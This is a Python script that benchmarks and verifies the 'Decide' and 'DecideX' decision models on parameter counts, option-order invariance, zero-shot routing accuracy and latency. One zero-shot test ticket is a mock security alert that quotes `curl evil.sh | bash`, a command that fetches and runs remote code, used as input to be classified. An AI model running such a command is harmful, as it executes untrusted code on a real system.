"""
Reproducible Evaluation & Verification Script for Decide and DecideX.

Run:
    python -m benchmarks.reproduce_all
    python -m benchmarks.reproduce_all --public-datasets   # requires `datasets` package
"""
import argparse
import math
import random
import time
from typing import Dict, List, Tuple
import numpy as np
import torch
import torch.nn as nn
import torch.nn.functional as F

from decide import (
    DecideConfig,
    DecideModel,
    DecideRuntime,
    FastDecideTokenizer,
    StructuredStateEnricher,
)
from decide.model import FastSelfAttentionBlock
from decide.training import evaluate_model, generate_multi_workflow_dataset

_PUNCT_TRANS_BENCH = str.maketrans({c: " " for c in '.,!?;:"()[]{}<>/\\|@#$%^&*~`+='})


def count_model_parameters(model: DecideModel) -> Dict[str, int]:
    total = sum(p.numel() for p in model.parameters())
    tok_emb = model.tok_emb.weight.numel()
    pos_emb = model.pos_emb.weight.numel()
    dense_active = total - tok_emb - pos_emb
    return {"total": total, "tok_emb": tok_emb, "pos_emb": pos_emb, "dense_active": dense_active}


def verify_permutation_invariance(rt: DecideRuntime, n_permutations: int = 50) -> Tuple[int, float]:
    opts_24 = {f"opt_{i:02d}": f"candidate routing destination {i} with description {i * 17}" for i in range(24)}
    q_base = {"route": {"type": "choice", "instructions": "Pick destination", "criteria": opts_24}}
    state = "Customer alice@acme.io writes: Please route this request to candidate destination 7."
    base_res = rt.predict(state, q_base, model="decidex")
    base_probs = base_res["answers"]["route"]["probabilities"]
    base_choice = base_res["answers"]["route"]["choice"]

    max_abs_diff = 0.0
    argmax_matches = 0
    keys = list(opts_24.keys())
    rng = random.Random(123)
    for _ in range(n_permutations):
        perm_keys = list(keys)
        rng.shuffle(perm_keys)
        q_perm = {
            "route": {
                "type": "choice",
                "instructions": "Pick destination",
                "criteria": {k: opts_24[k] for k in perm_keys},
            }
        }
        r_p = rt.predict(state, q_perm, model="decidex")
        p_probs = r_p["answers"]["route"]["probabilities"]
        if r_p["answers"]["route"]["choice"] == base_choice:
            argmax_matches += 1
        for k in keys:
            diff = abs(base_probs[k] - p_probs[k])
            if diff > max_abs_diff:
                max_abs_diff = diff
    return argmax_matches, max_abs_diff


def evaluate_unseen_schema_zero_shot(rt: DecideRuntime) -> Dict[str, float]:
    """
    Evaluates the shipped Decide & DecideX checkpoints zero-shot on an unseen question schema
    (different question IDs, option keys, and wording than the training schema).
    """
    zs_templates = [
        (
            "Cloud FinOps alert: AWS account #8812 was billed twice for reserved instances this month. "
            "Requesting immediate credit refund on the invoice or we will terminate our enterprise agreement.",
            0, 2, 1,
        ),
        (
            "SRE Pager: Kubernetes ingress controller returning 502 Bad Gateway across us-east-1 worker nodes "
            "after kernel upgrade. Production traffic blocked.",
            1, 2, 0,
        ),
        (
            "Enterprise deal desk: Fortune 500 prospect requesting custom annual quote for 400 seats "
            "with SOC2 and dedicated VPC deployment.",
            2, 0, 0,
        ),
        (
            "SOC Threat alert: Unauthorized SSH key exfiltration and remote shell execution `curl evil.sh | bash` "
            "detected on production bastion host. Block immediately!",
            3, 3, 0,
        ),
    ]
    unseen_questions = {
        "queue": {
            "type": "choice",
            "instructions": "Select the operational response unit for this event:",
            "criteria": {
                "finops_ledger": "invoices, duplicate charges, payment refunds, billing credits",
                "sre_platform": "production outages, cluster crashes, gateway bugs, system errors",
                "deal_desk": "enterprise quotes, seat expansion, annual contract pricing",
                "soc_response": "malicious exploits, credential exfiltration, security breaches",
            },
        },
        "priority_rank": {
            "type": "score",
            "instructions": "Rate the operational response priority level:",
            "criteria": [
                "routine inquiry, no time pressure",
                "moderate priority, address soon",
                "critical production or financial blocker",
                "emergency active security breach",
            ],
        },
        "money_back_claim": {
            "type": "noul",
            "instructions": "Is the sender requesting a financial refund or credit?",
        },
    }
    q_keys = ["finops_ledger", "sre_platform", "deal_desk", "soc_response"]
    c_dec, c_decx, total = 0, 0, 0
    for i in range(100):
        txt, gt_q, gt_p, gt_m = zs_templates[i % 4]
        st_txt = f"[Event ID #{9000 + i}] {txt}"
        r_d = rt.predict(" ".join(st_txt.split()[:29]), unseen_questions, model="decide")
        r_x = rt.predict(st_txt, unseen_questions, model="decidex")

        c_dec += int(r_d["answers"]["queue"]["choice"] == q_keys[gt_q])
        c_decx += int(r_x["answers"]["queue"]["choice"] == q_keys[gt_q])

        d_p = int(max(r_d["answers"]["priority_rank"]["probabilities"].items(), key=lambda kv: kv[1])[0])
        x_p = int(max(r_x["answers"]["priority_rank"]["probabilities"].items(), key=lambda kv: kv[1])[0])
        c_dec += int(d_p == gt_p)
        c_decx += int(x_p == gt_p)

        c_dec += int((r_d["answers"]["money_back_claim"]["noul"] >= 0.5) == bool(gt_m))
        c_decx += int((r_x["answers"]["money_back_claim"]["noul"] >= 0.5) == bool(gt_m))
        total += 3

    return {"decide_zs_acc": c_dec / total, "decidex_zs_acc": c_decx / total, "n_decisions": total}


def benchmark_latency_modes(device: torch.device, iterations: int = 20) -> List[Dict[str, float]]:
    rt_cold = DecideRuntime(device=device, cache_states=False, cache_questions=False)
    rt_schema = DecideRuntime(device=device, cache_states=False, cache_questions=True)
    rt_warm = DecideRuntime(device=device, cache_states=True, cache_questions=True)

    rows = []
    for q_cnt in [1, 5, 10, 25, 50]:
        q_schema = {
            f"q_{i}": {
                "type": "choice",
                "instructions": f"Which operational queue handles routing request #{i}?",
                "criteria": {
                    "billing": "invoices, payments, refunds, receipts",
                    "technical": "bugs, outages, crashes, infrastructure",
                    "sales": "pricing, enterprise quotes, seat upgrades",
                    "security": "intrusion, credential leaks, malicious exploits",
                },
            }
            for i in range(q_cnt)
        }
        rt_cold.predict("Warmup", q_schema, model="decide")
        rt_cold.predict("Warmup", q_schema, model="decidex")
        rt_schema.predict("Warmup", q_schema, model="decide")
        rt_schema.predict("Warmup", q_schema, model="decidex")
        fixed_state = "Customer ticket #9999: Charged twice on March invoice #9999. Please issue a refund today."
        rt_warm.predict(fixed_state, q_schema, model="decide")
        rt_warm.predict(fixed_state, q_schema, model="decidex")

        t_dc, t_dxc, t_ds, t_dxs, t_dw, t_dxw = [], [], [], [], [], []
        for i in range(iterations):
            st_i = f"Customer ticket #{2000 + i}: Charged twice on March invoice #{5000 + i}. Please issue a refund today."
            if device.type == "cuda":
                torch.cuda.synchronize()
            t0 = time.perf_counter()
            rt_cold.predict(st_i, q_schema, model="decide")
            if device.type == "cuda":
                torch.cuda.synchronize()
            t_dc.append((time.perf_counter() - t0) * 1000.0)

            t0 = time.perf_counter()
            rt_cold.predict(st_i, q_schema, model="decidex")
            if device.type == "cuda":
                torch.cuda.synchronize()
            t_dxc.append((time.perf_counter() - t0) * 1000.0)

            t0 = time.perf_counter()
            rt_schema.predict(st_i, q_schema, model="decide")
            if device.type == "cuda":
                torch.cuda.synchronize()
            t_ds.append((time.perf_counter() - t0) * 1000.0)

            t0 = time.perf_counter()
            rt_schema.predict(st_i, q_schema, model="decidex")
            if device.type == "cuda":
                torch.cuda.synchronize()
            t_dxs.append((time.perf_counter() - t0) * 1000.0)

            t0 = time.perf_counter()
            rt_warm.predict(fixed_state, q_schema, model="decide")
            if device.type == "cuda":
                torch.cuda.synchronize()
            t_dw.append((time.perf_counter() - t0) * 1000.0)

            t0 = time.perf_counter()
            rt_warm.predict(fixed_state, q_schema, model="decidex")
            if device.type == "cuda":
                torch.cuda.synchronize()
            t_dxw.append((time.perf_counter() - t0) * 1000.0)

        rows.append({
            "Q": q_cnt,
            "decide_cold_ms": float(np.median(t_dc)),
            "decidex_cold_ms": float(np.median(t_dxc)),
            "decide_fresh_state_ms": float(np.median(t_ds)),
            "decidex_fresh_state_ms": float(np.median(t_dxs)),
            "decide_warm_cache_ms": float(np.median(t_dw)),
            "decidex_warm_cache_ms": float(np.median(t_dxw)),
        })
    return rows


def main():
    parser = argparse.ArgumentParser(description="Reproduce Decide & DecideX benchmarks and verification checks.")
    parser.add_argument("--device", default="auto", help="cuda or cpu")
    args = parser.parse_args()

    device = torch.device(("cuda" if torch.cuda.is_available() else "cpu") if args.device == "auto" else args.device)
    rt = DecideRuntime(device=device)

    p_dec = count_model_parameters(rt.decide_model)
    p_decx = count_model_parameters(rt.decidex_model)
    print("=== 1. Exact Parameter Counts ===")
    print(f"Decide  (decide-v1):  Total={p_dec['total']:,} ({p_dec['total']/1e6:.2f}M) | TokEmb={p_dec['tok_emb']:,} | PosEmb={p_dec['pos_emb']:,} | DenseActive={p_dec['dense_active']:,} ({p_dec['dense_active']/1e6:.2f}M)")
    print(f"DecideX (decidex-v1): Total={p_decx['total']:,} ({p_decx['total']/1e6:.2f}M) | TokEmb={p_decx['tok_emb']:,} | PosEmb={p_decx['pos_emb']:,} | DenseActive={p_decx['dense_active']:,} ({p_decx['dense_active']/1e6:.2f}M)")

    print("\n=== 2. Option Permutation Invariance (50 Random Shuffles of 24 Options) ===")
    matches, max_drift = verify_permutation_invariance(rt, 50)
    print(f"Argmax agreement: {matches}/50 | Max absolute probability drift: {max_drift:.6f}")

    print("\n=== 3. Shipped Checkpoints on Held-Out Multi-Workflow Validation Split (1,200 Decisions) ===")
    val_data = generate_multi_workflow_dataset(1600, seed=42)[1200:]
    val_fast = [{**r, "state": " ".join(r["state"].split()[:29])} for r in val_data]
    m_d = evaluate_model(rt.decide_model, val_fast, rt.tokenizer, device)
    m_x = evaluate_model(rt.decidex_model, val_data, rt.tokenizer, device)
    print(f"Decide  (Shipped FP16 Weights): Acc={m_d['accuracy']*100:.2f}% | Choice={m_d['choice_acc']*100:.2f}% | Score={m_d['score_acc']*100:.2f}% | Noul={m_d['noul_acc']*100:.2f}% | ECE={m_d['ece']:.4f}")
    print(f"DecideX (Shipped FP16 Weights): Acc={m_x['accuracy']*100:.2f}% | Choice={m_x['choice_acc']*100:.2f}% | Score={m_x['score_acc']*100:.2f}% | Noul={m_x['noul_acc']*100:.2f}% | ECE={m_x['ece']:.4f}")

    print("\n=== 4. Unseen-Schema Zero-Shot Transfer (300 Decisions, Unseen Question & Option Keys) ===")
    zs = evaluate_unseen_schema_zero_shot(rt)
    print(f"Decide  Zero-Shot Transfer: {zs['decide_zs_acc']*100:.2f}% ({int(zs['decide_zs_acc']*zs['n_decisions'])}/{zs['n_decisions']})")
    print(f"DecideX Zero-Shot Transfer: {zs['decidex_zs_acc']*100:.2f}% ({int(zs['decidex_zs_acc']*zs['n_decisions'])}/{zs['n_decisions']})")

    print(f"\n=== 5. End-to-End Latency Breakdown on {device} (Cold Uncached vs Fresh-State Schema-Cached vs Warm Cache) ===")
    print(f"{'Q':>3s} | {'Decide Cold':>12s} | {'DecideX Cold':>13s} | {'Decide FreshSt':>14s} | {'DecideX FreshSt':>15s} | {'Decide Warm':>12s} | {'DecideX Warm':>13s}")
    print("-" * 96)
    iters = 15 if device.type == "cuda" else 3
    for r in benchmark_latency_modes(device, iterations=iters):
        print(
            f"{r['Q']:3d} | {r['decide_cold_ms']:9.2f} ms | {r['decidex_cold_ms']:10.2f} ms | "
            f"{r['decide_fresh_state_ms']:11.2f} ms | {r['decidex_fresh_state_ms']:12.2f} ms | "
            f"{r['decide_warm_cache_ms']:9.2f} ms | {r['decidex_warm_cache_ms']:10.2f} ms"
        )


if __name__ == "__main__":
    main()
